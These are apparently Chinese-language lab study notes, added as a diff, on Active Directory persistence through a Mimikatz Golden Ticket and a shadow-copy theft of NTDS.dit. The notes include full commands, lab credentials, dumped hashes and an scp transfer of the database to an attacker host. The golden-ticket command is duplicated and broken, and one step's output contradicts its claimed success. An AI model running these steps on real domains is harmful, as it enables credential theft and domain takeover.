@@ -705,4 +705,330 @@ PS C:\Windows\system32>
 
 ```
 ## Active Directory Persistence
-### Overpass the Hash
+Persistence（持久性） 是指當我們在取得初始存取權限後，建立機制確保長期存取目標系統或網域，即使：系統重新啟動、使用者變更密碼、部分惡意程式被移除，也不會失去對目標網路的控制。
+### Golden Ticket
+>[!Important]
+>Golden Ticket Attack:
+>- Kerberos 認證流程：
+>1. 使用者請求 TGT（Ticket Granting Ticket）。
+>2. KDC（Key Distribution Center）使用 krbtgt 帳號的密碼雜湊（NTLM Hash）來加密 TGT。
+>3. 這張 TGT 被使用者用來請求存取不同服務（TGS, Ticket Granting Service）。
+>- Golden Ticket 攻擊：
+如果能取得 krbtgt 的 NTLM Hash，則可以 `自行產生 TGT`，並宣稱 任何帳號擁有最高權限。\
+由於 TGT 是用 krbtgt 的密碼雜湊加密的，所以 Domain Controller（DC）會信任這張票證，無論這張票證是否合法。\
+>自己創建我們 TGT，就稱為 Golden Ticket
+
+也因為 krbtgt 密碼不會自動變更，所以可以長期使用 Golden Ticket 繞過所有帳戶密碼變更
+
+#### 1. 測試目前使用者無法存取 Domain Controller
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jen  /p:Nexus123! /v:192.168.136.74
+```
+在 CLIENT74 使用 PsExec 嘗試登入 DC1
+```
+PS C:\Tools\SysinternalsSuite> .\PsExec64.exe \\DC1 cmd.exe
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Couldn't access DC1:
+Access is denied.
+```
+#### 2. 取得 krbtgt NTLM Hash
+>[!Important]
+必須擁有 Domain Admin 權限 或 控制 Domain Controller
+
+改用 `jeffadmin` 在 DC1 上使用 Mimikatz 提取 krbtgt NTLM Hash
+```
+┌──(chw㉿CHW)-[~/Tools]
+└─$ xfreerdp /cert-ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.136.70
+```
+```
+PS C:\Tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /patch
+Domain : CORP / S-1-5-21-1987370270-658905905-1781884369
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 1693c6cefafffc7af11ef34d1c788f47
+```
+>取得 krbtgt 的 NTLM Hash：`1693c6cefafffc7af11ef34d1c788f47`
+
+#### 2. 清除現有 Kerberos 票證
+返回 jen RDP 的 CLIENT74
+```
+PS C:\Windows\system32> cd C:\Tools\
+PS C:\Tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+```
+> 清除現有的 Kerberos ticket，確保不影響新的 Golden Ticket 注入
+
+#### 3. 生成 Golden Ticket
+使用 Mimikatz 創建 TGT：\
+使用 `/krbtgt` 而不是 `/rc4` 來表示我們提供 krbtgt 用戶的密碼雜湊
+![image](https://hackmd.io/_uploads/rJSGoNl2kg.png)
+```
+mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+User      : jen
+Domain    : corp.com
+ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
+Lifetime  : 3/13/2025 4:00:51 AM ; 3/11/2035 4:00:51 AM ; 3/11/2035 4:00:51 AM
+-> Ticket : ** Pass The Ticket **
+
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'jen @ corp.com' successfully submitted for current session
+```
+> jen 現在擁有完整 Domain Admin 權限
+
+#### 4. 使用 PsExec 登入 Domain Controller
+```
+PS C:\Tools\SysinternalsSuite> .\PsExec.exe \\dc1 cmd.exe
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Couldn't access dc1:
+Invalid Signature.
+PS C:\Tools\SysinternalsSuite> hostname
+client74
+PS C:\Tools\SysinternalsSuite> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::80d9:bf05:fca1:baf5%6
+   IPv4 Address. . . . . . . . . . . : 192.168.136.74
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.136.254
+```
+> jen 成功取得 DC1 的存取權限
+
+#### 5. 驗證是否成功加入 Domain Admin
+
+```
+C:\Windows\system32>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes    
+=========================================== ================ ============================================ ===============================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+CORP\Domain Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
+...
+```
+> jen 已變成 Domain Admins 群組 member
+
+#### - PsExec 指定 IP 會失敗
+>[!Caution]
+>如果使用 PsExec 指定 IP（強迫 NTLM）則攻擊會失敗
+
+```
+C:\Tools\SysinternalsSuite> psexec.exe \\192.168.136.70 cmd.exe
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Couldn't access 192.168.136.70:
+Access is denied.
+```
+>[!Important]
+>必須透過主機名稱來觸發 Kerberos 驗證
+```
+C:\Tools\SysinternalsSuite> psexec.exe \\dc1 cmd.exe
+```
+### Shadow Copies
+離線提取所有使用者的 NTLM Hash 和 Kerberos 金鑰，進而進行 密碼破解、Pass-the-Hash、Golden Ticket attack
+>[!Note]
+>**Shadow Copy**:\
+>[Shadow Copy](https://en.wikipedia.org/wiki/Shadow_Copy)（Volume Shadow Service, VSS） 是 微軟內建的備份技術，允許建立文件或整個磁碟的快照，主要用於：
+>- 系統備份
+>- 還原舊版本的文件
+>- 容錯恢復
+>
+>可濫用 Shadow Copy 來 複製 Active Directory 資料庫  [NTDS.dit](https://technet.microsoft.com/en-us/library/cc961761.aspx)，並透過工具 離線提取所有使用者的密碼 Hash。
+
+Microsoft signed binary [vshadow.exe](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) is offered as part of the [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/).
+
+>[!Important]
+目標: 複製 NTDS.dit 資料庫並提取 AD 使用者的密碼 Hash\
+需滿足條件：\
+>1. 擁有 Domain Admin 權限
+>2. 需要在 Domain Controller 上操作
+
+#### 1. 創建 Shadow Copy
+以 jeffadmin 登入 DC1 網域控制站
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /cert-ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.136.70
+```
+```
+PS C:\Tools> .\vshadow.exe -nw -p C:
+
+VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
+Copyright (C) 2005 Microsoft Corporation. All rights reserved.
+
+
+(Option: No-writers option detected)
+(Option: Persistent shadow copy)
+(Option: Create shadow copy set)
+- Setting the VSS context to: 0x00000019
+Creating shadow set {0d109c76-1214-4bb4-ac61-eab7c5547bce} ...
+- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
+Creating the shadow (DoSnapshotSet) ...
+(Waiting for the asynchronous operation to finish...)
+Shadow copy set succesfully created.
+
+List of created shadow copies:
+
+
+Querying all shadow copies with the SnapshotSetID {0d109c76-1214-4bb4-ac61-eab7c5547bce} ...
+
+* SNAPSHOT ID = {a05b566d-52fa-413a-add4-5ea80ebc1fd5} ...
+   - Shadow copy Set: {0d109c76-1214-4bb4-ac61-eab7c5547bce}
+   - Original count of shadow copies = 1
+   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
+   - Creation Time: 3/13/2025 7:22:32 AM
+   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+   - Originating machine: DC1.corp.com
+   - Service machine: DC1.corp.com
+   - Not Exposed
+   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
+   - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+
+Snapshot creation done.
+```
+>`-nw`:	No Writers, 不通知 VSS Writers，直接建立 Shadow Copy，加速備份（不保證資料一致性）\
+`-p`: Persistent（持久性）, Shadow Copy 不會自動刪除，可手動存取和複製檔案\
+`C`: 目標磁碟（此指令建立 C 槽的Shadow Copy）
+>> Shadow copy device name: `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`
+
+#### 2. 複製 Active Directory 資料庫
+將 Shadow Copy 中的 NTDS.dit（AD database） 複製到 `C:\`：
+```
+PS C:\Tools> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+```
+#### 3. 複製 SYSTEM Hive
+NTDS.dit 被加密，需要從 Windows registry 中 SYSTEM Hive 來解密：
+```
+PS C:\Tools> cd /
+PS C:\> reg.exe save hklm\system c:\system.bak
+The operation completed successfully.
+```
+#### 4. 轉移檔案到 Kali Linux
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo systemctl start ssh
+[sudo] password for chw: 
+```
+```
+PS C:\> scp C:\ntds.dit.bak C:\system.bak chw@192.168.45.235:~/
+```
+#### 5. 在 Kali 上提取 NTLM Hash
+```
+┌──(chw㉿CHW)-[~]
+└─$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
+[*] Reading and decrypting hashes from ntds.dit.bak
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
+dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
+jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
+jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
+iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
+WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:87db4a6147afa7bdb46d1ab2478ffe9e:::
+FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:d75ffc4baaeb9ed40f7aa12d1f57f6f4:::
+CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:5eca857673356d26a98e2466a0fb1c65:::
+CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:b57715dcb5b529f212a9a4effd03aaf6:::
+pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
+jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
+CLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:6f93b1d8bbbe2da617be00961f90349e:::
+[*] Kerberos keys from ntds.dit.bak
+Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
+Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
+Administrator:des-cbc-md5:fd79dc380ee989a4
+DC1$:aes256-cts-hmac-sha1-96:fb2255e5983e493caaba2e5693c67ceec600681392e289594b121dab919cef2c
+DC1$:aes128-cts-hmac-sha1-96:68cf0d124b65310dd65c100a12ecf871
+DC1$:des-cbc-md5:f7f804ce43264a43
+krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
+krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
+krbtgt:des-cbc-md5:683bdcba9e7c5de9
+...
+[*] Cleaning up...
+```
+>`impacket-secretsdump`: 專門用來 提取 NTLM Hash、Kerberos 金鑰\
+`-ntds ntds.dit.bak`: 指定 AD 資料庫 ntds.dit.bak\
+`-system system.bak`: 指定 SYSTEM Hive（HKLM\SYSTEM），用於解密 ntds.dit 中的密碼 Hash\
+`LOCAL`: 表示 在本機解析 ntds.dit，而非透過遠端存取 AD（例如 -target 模式）
+
+顯示 AD 內所有使用者的 NTLM Hash 後：
+- 破解 NTLM Hash（Hashcat, John the Ripper）
+- 進行 Pass-the-Hash 
+- 偽造 Golden Ticket
+
+
+>[!Important]
+>Shadow Copy vs. 其他 AD Persistence\
+>![image](https://hackmd.io/_uploads/SJFSESe2Je.png)
+
+# Enumerating AWS Cloud Infrastructure
+
